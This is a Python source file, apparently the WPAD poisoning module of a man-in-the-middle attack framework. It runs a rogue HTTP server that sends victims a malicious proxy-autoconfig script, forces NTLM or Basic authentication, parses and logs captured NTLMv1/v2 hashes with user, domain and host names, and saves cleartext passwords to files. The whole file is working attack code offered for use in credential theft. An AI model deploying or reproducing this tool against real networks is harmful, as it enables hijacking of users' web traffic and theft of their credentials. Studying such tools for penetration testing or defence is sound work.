import socket
import threading
import logging
import re

from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
from core.configwatcher import ConfigWatcher
from core.responder.common import *
from HTTPPackets import *

mitmf_logger = logging.getLogger("mitmf")

class WPADPoisoner():

	def start(self, options):

		global args; args = options
		args.forceWpadAuth = False
		args.basic = False

		try:
			mitmf_logger.debug("[WPADPoisoner] online")
			server = ThreadingTCPServer(("0.0.0.0", 80), HTTP)
			t = threading.Thread(name="HTTP", target=server.serve_forever)
			t.setDaemon(True)
			t.start()
		except Exception, e:
			mitmf_logger.error("[WPADPoisoner] Error starting on port {}: {}".format(80, e))

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

#HTTP Server Class
class HTTP(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				self.request.settimeout(1)
				data = self.request.recv(8092)
				buff = WpadCustom(data,self.client_address[0])
				if buff and args.forceWpadAuth is False:
					mitmf_logger.info("[WPADPoisoner] WPAD (no auth) file sent to: {}".format(self.client_address[0]))
					self.request.send(buff)
				else:
					buffer0 = PacketSequence(data,self.client_address[0])
					self.request.send(buffer0)
		except Exception as e:
			pass

#Parse NTLMv1/v2 hash.
def ParseHTTPHash(data,client):
	LMhashLen = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	NthashLen = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	if NthashLen == 24:
		NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		HostNameLen = struct.unpack('<H',data[46:48])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		outfile = "./logs/responder/HTTP-NTLMv1-Client-"+client+".txt"
		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
		WriteData(outfile,WriteHash, User+"::"+Hostname)
		mitmf_logger.info('[+]HTTP NTLMv1 hash captured from :%s'%(client))
		mitmf_logger.info('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
		mitmf_logger.info('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
		mitmf_logger.info('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))

	if NthashLen > 24:
		NthashLen = 64
		DomainLen = struct.unpack('<H',data[28:30])[0]
		DomainOffset = struct.unpack('<H',data[32:34])[0]
		Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[36:38])[0]
		UserOffset = struct.unpack('<H',data[40:42])[0]
		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
		HostNameLen = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		outfile = "./logs/responder/HTTP-NTLMv2-Client-"+client+".txt"
		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
		WriteData(outfile,WriteHash, User+"::"+Domain)
		mitmf_logger.info('[+]HTTP NTLMv2 hash captured from :%s'%(client))
		mitmf_logger.info('[+]HTTP NTLMv2 User is : %s'%(User))
		mitmf_logger.info('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
		mitmf_logger.info('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
		mitmf_logger.info('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))

def WpadCustom(data,client):
	WPAD_Script = ConfigWatcher.getInstance().getConfig()["Responder"]['WPADScript']
	Wpad = re.search('(/wpad.dat|/*\.pac)', data)
	if Wpad:
		buffer1 = WPADScript(Payload=WPAD_Script)
		buffer1.calculate()
		return str(buffer1)
	else:
		return False

# Function used to check if we answer with a Basic or NTLM auth.
def Basic_Ntlm(Basic):
	if Basic == True:
		return IIS_Basic_401_Ans()
	else:
		return IIS_Auth_401_Ans()

#Handle HTTP packet sequence.
def PacketSequence(data,client):
	Ntlm = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
	BasicAuth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)

	if Ntlm:
		packetNtlm = b64decode(''.join(Ntlm))[8:9]
		if packetNtlm == "\x01":
			r = NTLM_Challenge(ServerChallenge=Challenge)
			r.calculate()
			t = IIS_NTLM_Challenge_Ans()
			t.calculate(str(r))
			buffer1 = str(t)
			return buffer1
		if packetNtlm == "\x03":
			NTLM_Auth= b64decode(''.join(Ntlm))
			ParseHTTPHash(NTLM_Auth,client)
			if args.forceWpadAuth and WpadCustom(data,client):
				mitmf_logger.info("[WPADPoisoner] WPAD (auth) file sent to: {}".format(client))
				buffer1 = WpadCustom(data,client)
				return buffer1
			else:
				buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
				buffer1.calculate()
				return str(buffer1)

	if BasicAuth:
		outfile = "./logs/responder/HTTP-Clear-Text-Password-"+client+".txt"
		WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
		mitmf_logger.info('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
		if args.forceWpadAuth and WpadCustom(data,client):
			mitmf_logger.info("[WPADPoisoner] WPAD (auth) file sent to: {}".format(client))
			buffer1 = WpadCustom(data,client)
			return buffer1
		else:
			buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
			buffer1.calculate()
			return str(buffer1)

	else:
		return str(Basic_Ntlm(args.basic))
			